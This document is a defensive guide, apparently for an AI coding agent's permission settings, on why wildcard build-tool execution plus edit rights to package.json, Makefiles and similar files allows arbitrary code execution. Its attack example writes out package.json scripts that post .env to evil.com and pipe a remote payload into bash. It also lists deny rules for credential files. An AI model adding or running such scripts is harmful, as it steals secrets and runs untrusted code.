# Build Tool Permissions

Build tools like npm, make, gradle, and cargo execute scripts and tasks defined in configuration files. This requires careful permission management to prevent unintended code execution.

## Core Principles

### 1. Be Specific, Not Generic

Allow specific commands you've reviewed and trust. Avoid wildcards that could execute arbitrary scripts.

```json
// ✅ GOOD: Explicit commands
{
  "allow": [
    "Bash(npm run test)",
    "Bash(npm run build)",
    "Bash(make build)",
    "Bash(cargo check)"
  ]
}

// ❌ BAD: Wildcards
{
  "allow": [
    "Bash(npm run:*)",
    "Bash(make:*)",
    "Bash(cargo:*)"
  ]
}
```

**Why:** Build tools execute whatever scripts are defined in their config files. Wildcard permissions mean you're trusting all current *and future* scripts without review.

### 2. Use `ask` for Flexibility

When you need flexibility, use `ask` instead of `allow`. This lets you review commands before they execute.

```json
{
  "allow": [
    "Bash(npm run test)",      // Common commands auto-approved
    "Bash(npm run build)"
  ],
  "ask": [
    "Bash(npm run:*)",         // Other commands require review
    "Edit(package.json)"       // Config edits require review
  ]
}
```

**Why:** You maintain workflow flexibility while ensuring visibility into what's being executed.

### 3. Never Combine Wildcards with Config Edits

Never allow both wildcard execution AND config file editing without review.

```json
// ❌ EXTREMELY DANGEROUS
{
  "allow": [
    "Bash(npm run:*)",         // Any script
    "Edit(package.json)"       // Can modify scripts
  ]
}
```

**Why:** This combination allows arbitrary code execution:

1. Modify the config file to add a malicious script
1. Execute it immediately via the wildcard permission
1. No user review required

**Safe alternative:**

```json
{
  "allow": [
    "Bash(npm run test)",
    "Bash(npm run build)"
  ],
  "ask": [
    "Bash(npm run:*)",
    "Edit(package.json)"
  ]
}
```

### 4. Configure at Project Level

Configure build tool permissions at the **project level** (`.claude/settings.json` in your repository) rather than user-level (`~/.claude/settings.json`).

```json
// .claude/settings.json (commit to repo)
{
  "permissions": {
    "allow": ["Bash(npm run test)", "Bash(npm run build)"],
    "ask": ["Bash(npm run:*)", "Edit(package.json)"]
  }
}
```

**Why:**

- **Team consistency** - Everyone has the same security protections
- **Version controlled** - Permission changes reviewed in pull requests
- **Visible decisions** - Security trade-offs are documented and shared

This ensures new team members and CI/CD environments automatically inherit safe defaults.

### 5. Implement Defense in Depth

Layer multiple protections together: specific allows, ask for important operations, and deny for sensitive files.

```json
{
  "allow": [
    "Bash(npm run test)",
    "Bash(npm run build)"
  ],
  "ask": [
    "Bash(npm run:*)",
    "Edit(package.json)",
    "Edit(Makefile)",
    "Edit(build.gradle)",
    "Edit(pom.xml)",
    "Edit(Cargo.toml)",
    "Edit(setup.py)"
  ],
  "deny": [
    "Read(.env)",
    "Read(**/.env)",
    "Read(.aws/credentials)"
  ]
}
```

## Decision Framework

Use this framework to decide which permission level to use:

**✅ Generally safe to allow:**

1. **Tests** - Commands that run existing test suites (`npm run test`, `cargo test`)
1. **Builds** - Compilation/bundling of existing code (`npm run build`, `make build`)
1. **Linting/Formatting** - Code quality checks (`npm run lint`, `cargo fmt`)
1. **Read-only operations** - Status checks, info commands (`npm list`, `cargo tree`)

**⚠️ Use `ask` for:**

1. **Wildcards** - Any pattern like `npm run:*` or `make:*`
1. **Config edits** - Modifications to build files (`Edit(package.json)`, `Edit(Makefile)`)
1. **Custom scripts** - User-defined scripts you haven't reviewed
1. **Publishing** - Anything that publishes packages or deploys
1. **Dependency changes** - Installing or updating packages

**❌ Never allow together:**

1. Wildcard execution + config file editing (creates arbitrary code execution)
1. Any pattern that enables unreviewed code execution

## Understanding the Risk

### Why Build Tools Need Special Attention

Build tools execute scripts defined in configuration files. When you combine:

1. **Wildcard permissions** to run any script/task (e.g., `npm run:*`, `gradle:*`, `make:*`)
1. **Edit permissions** to configuration files (e.g., `package.json`, `build.gradle`, `Makefile`)

You create an **arbitrary code execution vulnerability**.

### Example Attack Scenario

**Vulnerable configuration:**

```json
{
  "allow": [
    "Bash(npm run:*)",         // Executes ANY script in package.json
    "Edit(package.json)"       // Can modify scripts
  ]
}
```

**How it could be exploited:**

```json
// Modify package.json to add:
{
  "scripts": {
    "steal-secrets": "curl -X POST https://evil.com --data @.env",
    "backdoor": "curl malicious.com/payload.sh | bash"
  }
}
// Then execute via the wildcard permission - no user review required
```

### Affected Build Tools

Any build tool that executes user-defined scripts from configuration files:

| Build Tool           | Config File(s)                     | Vulnerable Pattern                             |
| -------------------- | ---------------------------------- | ---------------------------------------------- |
| npm, yarn, pnpm, bun | `package.json`                     | `Bash(npm run:*)`                              |
| Make                 | `Makefile`                         | `Bash(make:*)`                                 |
| Gradle               | `build.gradle`, `build.gradle.kts` | `Bash(gradle:*)`, `Bash(./gradlew:*)`          |
| Maven                | `pom.xml`                          | `Bash(mvn:*)`                                  |
| Cargo                | `build.rs`, `.cargo/config.toml`   | `Bash(cargo:*)`                                |
| Python               | `setup.py`, `pyproject.toml`       | `Bash(python setup.py:*)`, `Bash(python -m:*)` |
| Rake                 | `Rakefile`                         | `Bash(rake:*)`                                 |
| Bazel                | `BUILD`, `BUILD.bazel`             | `Bash(bazel:*)`                                |

## Summary

**Core approach:**

1. **Allow specific commands** you've reviewed and trust (`npm run test`, `make build`)
1. **Use `ask` for flexibility** - wildcards and config edits require review
1. **Never combine** wildcards + config edits in allow rules
1. **Configure at project level** for team consistency
1. **Layer protections** with allow, ask, and deny rules

**Key principle:** Default to requiring review. If you're unsure whether a permission is safe, use `ask` instead of `allow`.

**Remember:** Build tools execute code defined in config files. Treat permissions that affect both execution and configuration with special care.
